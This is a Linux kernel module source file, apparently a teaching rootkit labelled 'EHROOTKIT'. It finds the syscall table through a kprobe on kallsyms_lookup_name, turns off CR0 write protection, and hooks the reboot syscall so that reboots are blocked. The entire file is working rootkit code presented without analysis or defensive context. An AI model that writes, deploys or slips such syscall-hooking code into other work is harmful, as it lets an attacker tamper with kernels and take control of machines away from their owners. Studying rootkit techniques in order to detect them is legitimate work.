#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/syscalls.h>

// Function Prototypes
unsigned long *get_system_call_table_address(void);
asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg);
void hook_sys_call(void);
void restore_reboot_sys_call(void);

// Manually set the write bit in CR0 register
static void my_write_cr0(long value) {
    __asm__ volatile("mov %0, %%cr0" :: "r"(value) : "memory");
}

// Macros for enabling/disabling write protection
#define disable_write_protection() my_write_cr0(read_cr0() & (~0x10000))
#define enable_write_protection() my_write_cr0(read_cr0() | (0x10000))

#define enable_reboot 0 // Controls whether reboot is allowed

unsigned long *sys_call_table_address;
asmlinkage int (*old_reboot_sys_call)(int, int, int, void*);

// Kprobe to find kallsyms_lookup_name
static struct kprobe kp = {
    .symbol_name = "kallsyms_lookup_name"
};

// Type definition for kallsyms_lookup_name function
typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);

// Function to get the system call table address
unsigned long *get_system_call_table_address(void) {
    kallsyms_lookup_name_t kallsyms_lookup_name;
    register_kprobe(&kp);
    kallsyms_lookup_name = (kallsyms_lookup_name_t) kp.addr;
    unregister_kprobe(&kp);
    unsigned long *address = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    return address;
}

// Custom reboot function
asmlinkage int hackers_reboot(int magic1, int magic2, int cmd, void *arg) {
    if (enable_reboot) {
        return old_reboot_sys_call(magic1, magic2, cmd, arg);
    }
    printk(KERN_NOTICE "EHROOTKIT: Blocked reboot Call");
    return EPERM; // Permission Denied
}

// Hook the reboot syscall
void hook_sys_call(void) {
    old_reboot_sys_call = (int (*)(int, int, int, void*))sys_call_table_address[__NR_reboot];
    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long) hackers_reboot;
    enable_write_protection();
    printk(KERN_NOTICE "EHROOTKIT: Hooked reboot Call");
}

// Restore the original reboot syscall
void restore_reboot_sys_call(void) {
    disable_write_protection();
    sys_call_table_address[__NR_reboot] = (unsigned long) old_reboot_sys_call;
    enable_write_protection();
}

// Module initialization function
static int __init startup(void) {
    sys_call_table_address = get_system_call_table_address();
    hook_sys_call();
    return 0;
}

// Module cleanup function
static void __exit shutdown(void) {
    restore_reboot_sys_call();
}

module_init(startup);
module_exit(shutdown);
MODULE_LICENSE("GPL");
